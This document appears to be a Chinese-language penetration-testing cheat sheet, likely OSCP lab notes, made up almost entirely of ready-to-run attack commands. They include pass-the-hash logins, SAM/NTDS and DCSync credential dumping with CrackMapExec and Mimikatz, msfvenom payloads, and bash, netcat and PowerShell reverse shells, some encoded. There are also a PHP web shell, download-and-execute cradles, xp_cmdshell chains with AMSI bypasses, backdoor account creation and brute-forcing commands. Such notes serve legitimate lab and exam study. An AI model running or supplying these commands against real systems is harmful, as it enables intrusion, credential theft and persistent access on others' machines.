>[!NOTE]
>因為一些指令四散在各處，所以多開一個章節，希望可以增加效率。
# 常用工具指令速查
>[!WARNING]
>用來掃描、列舉主機資訊的相關工具，同時也有一些常用的攻擊工具
## Evil-WinRM 
>[!WARNING]
>拿到帳密後可以用於登入拿shell的好東西
### 基礎使用
- 帳號密碼登入
```
evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987
```
- 帳號密碼登入 - SSL登入 
```
evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -S
```
- PassTheHash 
```
evil-winrm -i 192.168.1.19 -u administrator -H 32196B56FFE6F45E294117B91A83BF38
```
### PowerShell 腳本導入
可以導入的有 Invoke-Mimiktz.ps1、Invoke-NinjaCopy.ps1、PowerView.ps1等等
- Mimiktz 
>powershell檔案要放在/opt/privsc/powershel
[吉哈伯連結 ](https://github.com/clymb3r/PowerShell/tree/master/Invoke-Mimikatz)
```
evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -s /opt/privsc/powershell
```
```
Bypass-4MSI
Invoke-Mimikatz.ps1
Invoke-Mimikatz
```
### 執行遠端文件
>將Winpeas.exe放在 /opt/privsc，
```
evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -e /opt/privsc
```
```
Bypass-4MSI
menu
Invoke-Binary /opt/privsc/winPEASx64.exe
```
## Rustscan 
>[!WARNING]
>OSCP Friendly 的工具
  - rustscan基礎掃描 
```
rustscan -a 192.168.100.1 -u 5000 -t 80000 --scripts none
```
- rustscan整合nmap
```
rustscan -a 192.168.100.1 -u 5000 -t 80000 --scripts -- -n -Pn -sC -sV -oN mylist.txt
```
## Ligolo-ng
>[!WARNING]
>OSCP Friendly 的工具
## rpcclient 
>[!WARNING]
> 於 Linux 中有一個工具名 Rpcclient，可執行使用者端的 MS-RPC 的函式。
- Login with creds 
```
rpcclient -U Administrator%Ignite@123 192.168.1.172
```
```
rpcclient -U support 10.10.10.192
```
- Domain Information Query
```
rpcclient $> querydominfo
```
- Get Domain Password Information
```
rpcclient $> getdompwinfo
```
- 查看功能變數名稱與使用者數量
```
rpcclient $> querydominfo
```
- 查看使用者清單
```
rpcclient $> enumdomusers
```
- 查看群組清單
```
rpcclient $> enumdomgroups
```
- 指定使用者帳號取得資訊
```
rpcclient $> queryuser [username]
```
- 查看使用者參加的群組
```
rpcclient $> queryusergroups 
```
- 查看印表機資訊
```
rpcclient $> enumprinters
```
- Domains enumeration
```
rpcclient $> enumdomains
```
- modify user account information
```
setuserinfo christopher.lewis 23 'Admin!23'
```
## Impacket系列
>[!WARNING]
>針對Windows的殺手級工具，整個家族有大量的工具，這邊統一做指令的統整 
## CrackmapExec
>[!WARNING]
>對內網偵蒐與打擊有很好的效果的工具
### 一般用法
- 基礎用法
``` shell
crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd'
```
- 執行cmd指令
``` shell
crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami
```
- 執行powershell指令
``` shell
crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'
```
- 檢查已登入用戶
``` shell
crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS' --lusers
crackmapexec smb 192.168.216.144 -u 'test' -p 'ppt1234!' --loggedon-users
```
- 使用本機登入
```
crackmapexec smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --local-auth
```
- 使用者列舉
```
crackmapexec smb 192.168.216.144 -u 'test' -p 'ppt1234!' --users
```
- 上船文件
```
cme smb 172.16.251.152 -u user -p pass --put-file /tmp/whoami.txt \\Windows\\Temp\\whoami.txt   
```
- 下載文件
```
cme smb 172.16.251.152 -u user -p pass --get-file \\Windows\\Temp\\whoami.txt /tmp/whoami.txt
```
- Pass The Hash
``` shell
crackmapexec smb <target(s)> -u username -H LMHASH:NTHASH  
crackmapexec smb <target(s)> -u username -H NTHASH
cme smb 172.16.157.0/24 -u administrator -H 'aad3b435b51404eeaa35b51404ee:5509de4ff0a6e8d9f4a61100e51' --local-auth
```
- list hash
```
cme smb 192.168.1.119 ‐u administrator ‐p '123456' ‐‐sam
crackmapexec wimri 192.168.216.144 -u 'administrator' -p 'pass1234!'  --sam/--lsa
```
- 抓取ntds
```
crackmapexec smb 192.168.216.144 -u 'administrator' -p 'pass1234!' --ntds
```
- 列舉群組
```
cme smb 192.168.1.119 ‐u administrator ‐p '123456' ‐‐local‐groups
```
- Password Spary
``` shell
crackmapexec 10.0.2.0/24 -u ‘admin’ -p ‘P@ssw0rd'
```
- 檢查Samba訊息
``` shell
crackmapexec smb ip_list.txt -u joe -p Flowers1 --shares
```
### AD專區
- asproasting
```
cme ldap 192.168.0.104 -u user.txt -p '' --asreproast output.txt
```
```
cme ldap 192.168.0.104 -u harry -p pass --asreproast output.txt
```
```
cme ldap 192.168.0.104 -u harry -p pass --trusted-for-delegation
```
- 收集bloodhound
```
crackmapexec ldap <ip> -u user -p pass --bloodhound --ns ip --collection All
```
- 掃描zerologo、petitpotam、nopac漏洞
```
crackmapexec smb <ip> -u '' -p '' -M zerologo
crackmapexec smb <ip> -u '' -p '' -M petitpotam
crackmapexec smb <ip> -u 'user' -p 'pass' -M nopac
```
### 搭配模組 
-  基礎配置
```
cme <protocol> <target(s)> -M <module name>.
cme smb -M mimikatz --options
```
- 使用mimikatz模組
```
cme 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M mimikatz
cme <protocol> <target(s)> -u Administrator -p 'P@ssw0rd' -M mimikatz -o COMMAND='privilege::debug
```
```
cme smb 192.168.255.131 -u Administrator -p pass -M mimikatz -o COMMAND='"lsadump::dcsync /domain:domain.local /user:krbtgt"
```
```
# List available modules
crackmapexec smb -L

# Module information
crackmapexec smb -M mimikatz --module-info

# View module options
crackmapexec smb -M mimikatz --options

# Mimikatz module
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M mimikatz
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -M mimikatz
crackmapexec smb 192.168.215.104 -u Administrator -p 'P@ssw0rd' -M mimikatz -o COMMAND='privilege::debug'
```
## MSFVenom
>[!WARNING]
>OSCP基本上是可以用的，但是不要用到meterpreter shell 
### Windows Shell
- Windows Meterpreter shell
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f exe -o meterpreter.exe
```
-  Windows non staged reverse shell(這個可以用netcat)
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f exe -o non_staged.exe
```
- Windows Powershell reverse shell
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -i 9 -f psh -o shell.ps1
```
- Windows Shellcode 
```
msfvenom -p windows/shell_reverse_tcp -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" LHOST=192.168.49.100 LPORT=80 -e x86/alpha_mixed -f c
```
### Python Shell
- Windows Python reverse shell
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 EXITFUNC=thread -f python -o shell.py 
```
### Web Shell
- Windows ASP reverse shell
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f asp -e x86/shikata_ga_nai -o shell.asp
```
- Windows ASPX reverse shell
```
msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -o shell.aspx
```
- PHP reverse shell
```
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f raw -o shell.php
```
### Java WAR reverse shell
```
msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f war -o shell.war
```

# Shell 相關指令速查
>[!WARNING]
> - reverse shell 
> - web shell
## 常見Reverse Shell
### netcat reverse shell
- Kali
```
sudo nc -lvnp 443
```
- Target
```
nc <LOCAL-IP> <PORT> -e /bin/bash
```
### buzybox
```
busybox nc 172.16.1.2 443 -e /bin/bash
```
```
busybox+nc+172.16.1.2+443+-e+/bin/bash
```
### netcat bind shell
- Kali
```
nc MACHINE_IP <port>
```
- Target
```
nc -lvnp <port> -e "cmd.exe"
```
### powercat reverse shell
``` powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.164:8000/powercat.ps1'); powercat -c 192.168.45.164 -p 4444 -e powershell"
```
### Linux Reverse Shell
```
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
```
``` bash
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
``` bash
/bin/sh -i >& /dev/tcp/10.10.14.11/4444 0>&1
```
### PowerShell Reverse Shell
``` powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
## Web Shell
``` php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

- 把web shell變成reverse shell
``` powershell
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```
## 升級為tty shell
- script
``` bash
script -c /bin/bash -q /dev/null
```
- stty
``` title:檢查row跟column的數量
stty -a
```
```
Ctrl + Z;
stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 49 columns 211; reset;
```
- python
``` python
python -c 'import pty; pty.spawn("/bin/bash")'
```
- rlwrap
```
rlwrap -cAr nc -nvlp 4444
```
## 拿到Windows Shell
```
evil-winrm -i 10.129.42.197 -u user -p password
```
```
winexe -U 'administrator%Pa$$w0rd' //192.168.0.7 cmd
```
```
pth-winexe -U 'administrator%<ntlm hash:ntlm hash>' // 192.168.0.7 cmd.exe
```
## Powershell Base64 Generator
``` python
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

# Linux 指令速查
>[!WARNING]
>善用Linux基礎指令，可以加快蒐集資料的速度
- 將raw-json翻譯成json
```
echo -n 'JSON FORMAT' | jq .
```
- 抓.config檔案內的版本號
``` shell
grep -i verion web.config
```
- 搜尋目錄以下所有的password
``` shell
grep -Ri password . 
```
- 搜尋目錄以下所有的password，但是過濾掉Lang
``` shell
grep -Ri password . | grep -v Lang
```
- 當處理一堆資料夾及一堆資料夾裡面的資料時，可以這樣把裡面的東西都輸出到`web.dir`
``` shell
find . -ls > web.dir
```
- curl for webshell
``` shell
curl http://192.168.248.249:8000/cms/media/webshell.pHp --get --data-urlencode "cmd=powershell -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.45.234/Invoke-PowerShellTcp.ps1')"
```
- Upload File
``` shell
curl -i -L -X POST -H "Content-Type: multipart/form-data" -F file="@//home/arri/Desktop/Amaterasu/test.txt" -F filename="/tmp/test.txt" [http://$IP:33414/file-upload](http://$ip:33414/file-upload.)
```
- 快速下載所有FTP的東西
```
wget --mirror ftp://username:password@ip.of.old.host
```
- 複製整包資料夾內的東西
``` bash
cp -r /mnt/c/AD/Tools/GPOddity/GPT_Out/* /mnt/c/AD/Tools/stdx-gp
```
## 遠端桌面相關
### 連線指令
- rdesktop
```
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```
- xfreerdp
```
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```
```
xfreerdp /v:192.168.51.128 /u:test1 /p:'1qaz@WSX' /size:87% /drive:share,/home/kali/Desktop/share /clipboard
```
```
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /_cert-ignore
```

### 開啟遠端指令
- 手動打開RDP
```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```
- 幫防火牆開3389的port
```
netsh advfirewall firewall add rule name="Remote Desktop" dir=in action=allow protocol=TCP localport=3389
```
- RDP Service檢查
```
sc query TermService
```
- 手動關閉RDP
```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
```
- netexec
```
netexec smb $IP -u administrator -p pass123 -M rdp -o ACTION=enable
```
## 建立連結
>[!NOTE]
>Marketing pg pratice

>[!WARNING]
>可以用於規避檢查使用者名稱
```
ln -sf /home/m.sander/personal/creds-for-2022.txt fk_this_box
```
``` bash title:可用的範例，第10行檢查username可以利用ln躲過
#! /bin/bash

if [ -z $1 ]; then
    echo "error: note missing"
    exit
fi

note=$1

if [[ "$note" =~ .*m.sander.* ]]; then
    echo "error: forbidden"
    exit
fi

difference=$(diff /home/m.sander/personal/notes.txt $note)

if [[ -z $difference ]]; then
    echo "no update"
    exit
fi

echo "Difference: $difference"

cp $note /home/m.sander/personal/notes.txt

echo "[+] Updated."

```
# Windows 指令速查
>[!WARNING]
>包括cmd、powershell、內建工具的指令
- 尋找東西
``` cmd
where /R C:\Windows bash.exe
```
- 建立後門帳號
``` cmd=
net user hacker01 password01 /add
net localgroup administratorshacker01 /add
```
- 複製東西
```
xcopy C:\AD\Tools\studentx.lnk \\dcorp-ci\AI
```
## PowerShell
>[!WARNING]
>包含所有跟PowerShell有關係的指令、Reverse Shell、列舉指令等等
>%%  %%
### Nishang Framework 
>[!WARNING]
>Ippsec推薦工具 

[nishang](https://github.com/samratashok/nishang)
[Invoke-PowerShellTcp](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
- Invoke-PowerShellTcp.ps1
``` powershell
Invoke-PowerShellTcp -Reverse -IPAddress <ip> -Port <port>
```
``` powershell=
powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 443
```
- Invoke-PowerShellTcp.ps1常見的搭配指令
``` powershell
IEX(New-Object Net.WebClient).DownloadString('http://<ip>:<port>/<script_name.ps1>')
```
- 如果透過cmd去跑，需要放powershell在前面 
``` powershell
powershell -c IEX(new-object net.webclient).DownloadString('http://10.10.14.8/Invoke-PowerShellTcp.ps1')
```
- 如果需要包成字串，就要做跳脫字元
``` powershell
"powershell -C \"IEX(new-object net.webclient).DownloadString('http://<ip>:<port>/<script_name.ps1>')\""
```
### 搜尋指令
- 讀取檔案並抓取關鍵字
``` powershell
cat .\create.tf |findstr alicloud_slb
```
- 抓曲目錄下所有folder的檔案
``` powershell
Get-ChildItem -Path C:\Users\GM045 -Recurse
```
- 檢查link的內容
``` powershell
Get-Content bash.lnk
```
### 密碼利用
- Execute block as an other user
``` powershell
$pass = ConvertTo-SecureString '<password>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<dom>\<username>", $pass)
```
- 透過竄改binpath來執行command 
``` powershell
Invoke-Command -Computer <computer_name> -Credential $cred -ScriptBlock { cmd.exe "/c <cmd>" }
```
``` powershell
Invoke-Command -Credential $cred -ScriptBlock { cmd.exe "/c <cmd>" }
```
``` powershell
Invoke-Command -Credential $cred -ScriptBlock { "whoami" }
```
## 當跑PowerShell Reverse Shell怪怪的時候
```
cmd.exe /c 'cmd指令'
```
# PowerView指令速查
>[!NOTE]
>- PowerView : https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
## Domain列舉指令
- 列出目前Domain資訊
``` powershell=
Get-Domain
```
- 列出目標Domain資訊
``` powershell=
Get-Domain -Domain moneycorp.local
```
- 顯示目前Domain的SID
``` powershell=
Get-DomainSID
```
-  顯示當前Domain的Policy
``` powershell=
Get-DomainPolicyData
(Get-DomainPolicyData).systemaccess
```
-  顯示目標Domain的Policy
``` powershell=
(Get-DomainPolicyData -domain moneycorp.local).systemaccess
```
- 顯示當前的 Domain Controller
``` powershell=
Get-DomainController
```
- 顯示目標Domain的Controller
``` powershell=
Get-DomainController -Domain moneycorp.local
```
- 顯示Domain的User
``` powershell=
Get-DomainUser
Get-DomainUser -Identity student1
```
``` powershell=
Get-DomainUser -Identity student1 -Properties * 
Get-DomainUser -Properties samaccountname,logonCount
```
- 搜尋Domain使用者資訊中的特定字串
``` powershell=
Get-DomainUser -LDAPFilter "Description=*built*" |
Select name,Description
```
- 顯示Domain中的Computer
``` powershell=
Get-DomainComputer | select Name
Get-DomainComputer -OperatingSystem "*Server 2022*"
Get-DomainComputer -Ping
```
- 顯示Domain中的群組
``` powershell=
Get-DomainGroup | select Name
Get-DomainGroup -Domain <targetdomain>
```
- 顯示群組中有包含admin
``` powershell=
Get-DomainGroup *admin
```
- 顯示特定User所參加的群組
``` powershell=
Get-DomainGroup -UserName "student1"
```
- 顯示本機的群組
``` powershell=
Get-NetLocalGroup -ComputerName dcorp-dc
```
- 顯示本機的Administrators群組裡面的成員
``` powershell=
Get-NetLocalGroupMember -ComputerName dcorp-dc -GroupName Administrators
```
- 顯示目標主機的actively logged users (needs administrative rights and 
remote registry on the target)
``` powershell=
Get-NetLoggedon -ComputerName dcorp-adminsrv
```
- 顯示目標主機本機帳號的actively logged users (needs administrative rights and 
remote registry on the target)
``` powershell=
Get-LoggedonLocal -ComputerName dcorp-adminsrv
```
- 顯示目標主機最後登入的帳號
``` powershell=
Get-LastLoggedOn -ComputerName dcorp-adminsrv
```
- 顯示domain中的FileShare
``` powershell=
Invoke-ShareFinder -Verbose
```
- 顯示domain中電腦內部的機敏資料
``` powershell=
Invoke-FileFinder -Verbose
```
- 顯示所有的File Server
``` powershell=
Get-NetFileServer
```
- 顯示當前的  current forest
``` powershell=
Get-ForestDomain -Verbose
```
- 找出特定網域使用者目前在哪些電腦上有登入會話 (user logon session)
``` powershell=
Find-DomainUserLocation
```
- DCSync 列舉
``` powershell
Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentx"}
```
- DCSync ACL 權限新增
``` powershell
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity studentx -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```
## Domain Forest and Domain Trust列舉指令
- 列舉當前的Forest
``` powershell=
Get-ForestDomain -Verbose
```
- 顯示Domain Trust
``` powershell=
Get-DomainTrust
```
- 顯示出 External Turst
``` powershell=
Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```
``` powershell=
Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```

## Domain ACLs列舉指令
- Get the ACLs associated with the specified object
``` powershell
Get-DomainObjectAcl -SamAccountName student1 -ResolveGUIDs
```
- Get the ACLs associated with the specified prefix to be used for search
``` powershell
Get-DomainObjectAcl -SearchBase "LDAP://CN=Domain
Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -
Verbose
```
``` powershell
(Get-Acl
'AD:\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local')
.Access
```
- Search for interesting ACEs
``` powershell
Find-InterestingDomainAcl -ResolveGUIDs
```
``` powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```
>[!NOTE]
>`-ResolveGUIDs`：將權限 GUID 翻譯成可讀的權限名稱
- Get the ACLs associated with the specified path
``` powershell
Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"
```
>[!NOTE]
>SYSVOL（存放 GPO、登入指令碼的共享）
- Resource-Based Constrained Delegation (RBCD)
``` powershell
Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-studentx$' -Verbose
```
``` powershell
Get-DomainRBCD
```

## GPO列舉指令
- 列出domain的GPO
``` powershell=
Get-DomainGPO
```
``` powershell=
Get-DomainGPO -ComputerIdentity dcorp-student1
```
- Get GPO(s) which use Restricted Groups or groups.xml for interesting
users
``` powershell=
Get-DomainGPOLocalGroup
```
- Get users which are in a local group of a machine using GPO
``` powershell=
Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity
dcorp-student1
```
- Get machines where the given user is member of a specific group
``` powershell=
Get-DomainGPOUserLocalGroupMapping -Identity student1 -
Verbose
```
- 顯示單一GPO訊息
``` powershell
(Get-DomainOU -Identity DevOps).gplink
[LDAP://cn={**0BF8D01C-1F62-4BDC-958C-57140B67D147**},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local;0]
```

``` powershell
Get-DomainGPO -Identity '{0BF8D01C-1F62-4BDC-958C-57140B67D147}'
```

``` powershell
Get-DomainGPO -Identity (Get-DomainOU -Identity DevOps).gplink.substring(11,(Get-DomainOU -Identity DevOps).gplink.length-72)
```
## OU列舉指令
- 顯示當前domain的 OU 
``` powershell=
Get-DomainOU
```
``` powershell=
Get-ADOrganizationalUnit -Filter * -Properties *
```
- Get GPO applied on an OU. Read GPOname from gplink attribute from
Get-NetOU
``` powershell=
Get-DomainGPO -Identity "{0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}"
```
- 顯示當前domain的OU內部管理的Computers
``` powershell=
(Get-DomainOU -Identity DevOps).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
```








# AD 內網擴散工具指令速查
>[!NOTE]
>收錄
>- Find-PSRemotingLocalAdminAccess
>- PowerHuntShares
## Find-PSRemotingLocalAdminAccess
- Github : https://github.com/RedTeamMagic/Powershell/blob/main/Find-PSRemotingLocalAdminAccess.ps1
- 當前的帳號對遠端主機是否有最高管理權限
``` powershell
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
```
``` powershell=
Find-PSRemotingLocalAdminAccess
```
``` cmd=
winrs -r:dcorp-adminsrv cmd
```
``` powershell=
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
```
## PowerHuntShares
- Github : https://github.com/NetSPI/PowerHuntShares
``` powershell
Import-Module PowerHuntShares.psm1
```
``` powershell
Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\temp\test  -HostList c:\temp\hosts.txt
```
``` powershell=
Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools\ -HostList C:\AD\Tools\servers.txt
```
## Invoke-SessionHunter
>[!NOTE]
>調查遠端主機存在哪些已開的互動式或網路登入 session

```
. C:\AD\Tools\Invoke-SessionHunter.ps1
```
``` powershell
Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access
```
``` powershell
Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt | select Hostname,UserSession,Access
```
## PowerUpSQL
>[!NOTE]
>主要用來在 Active Directory 環境中找出 SQL Server，並且收集它們的基本資訊。
```
Import-Module C:\AD\Tools\PowerUpSQL-master\PowerupSQL.psd1
```
- 自動掃描 AD 網域裡所有 SQL Server
```
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
```
- SQL Server 的「連結伺服器 (Linked Servers)」拓樸
```
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose
```
>[!TIP]
Microsoft SQL Server 裡，**Linked Server** 是一種可以讓一台 SQL Server 去存取另一台 SQL Server（甚至是其他資料來源）的設定，DBA 為方便管理，常常建立 Linked Server，但如果安全性設定不當，可能使用固定的高權限帳號去連，或是可能允許執行遠端查詢甚至 `xp_cmdshell`。
- 執行程式碼
```
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'set username'"
```
- Reverse Shell
```
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.x/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.x/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.x/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sqlx
  ```
# 密碼相關
>[!WARNING]
>一些破解密碼的小程式
## 解密
- gpp-decrypt (SVC_TGS decrypt)
```
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```
## 密碼爆破
### John the Ripper
- MD5
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash1.txt --format=raw-md5
```
- shadow 
```
john --format=sha512crypt unshadow --wordlist=/usr/share/wordlists/rockyou.txt
```
- NTLM hash
```
john --format=NT ntlm.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
### Hydra
- SSH
```
hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.10.163.18
```
- HTTP-Post
```
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.163.18 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```
# 資料傳輸相關
>[!WARNING]
>讓資料攻擊跟目標互相傳輸資料的方法
## nc.exe
>粗暴好用
```
nc -nvlp 4444 >20231223144028_ILFREIGHT.zip
```
```
nc -w 3 10.10.15.20 4444 < 20231223144028_ILFREIGHT.zip
```
## SCP
- 傳輸一整個資料夾的內容到目標主機
```shell-session
scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```
- 出現以下錯誤可以用`-O`參數處理
```
scp -i id_rsa max@192.168.247.100:/etc/passwd .
scp: Received message too long 1094927173
scp: Ensure the remote shell produces no output for non-interactive sessions.
```
```
scp -i id_rsa -O /home/kali/Desktop/PG_PRATICE/Linux/Sorcerer/home/max/.ssh/authorized_keys  max@192.168.247.100:/home/max/.ssh/authorized_keys
```

## SMB相關
### 一鍵下載SMB所有資料
```
smb: \> prompt off
smb: \> recurse on
smb: \> mget *
```
### 一鍵開啟SMB server
```
smbserver.py -smb2support CompData /home/ltnbob/Documents/
```
```
sudo impacket-smbserver share -smb2support /tmp/smbshare
```
### 複製資料到SMB server
```
copy \\192.168.220.133\share\nc.exe
```
``` cmd
net use n: \\192.168.220.133\share /user:test test
```
## PowerShell 各種操作
### 下載資料
``` powershell
iwr -uri http://192.168.119.5:8000/winPEASx64.exe -Outfile winPEAS.exe
```
``` powershell
(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')
```
``` powershell
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```
- Fileless Download Method
``` powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```
### 上傳資料
``` powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```

``` powershell
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```
## 一鍵開啟FTP server
```
sudo python3 -m pyftpdlib --port 21
```
- 用PowerShell抓資料
``` powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftp-file.txt')
```
# 一些酷酷的指令
>[!NOTE]
>一些不知道要分類在哪裡的東西，暫時存放在這裡
## 開啟passthehash
```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
```
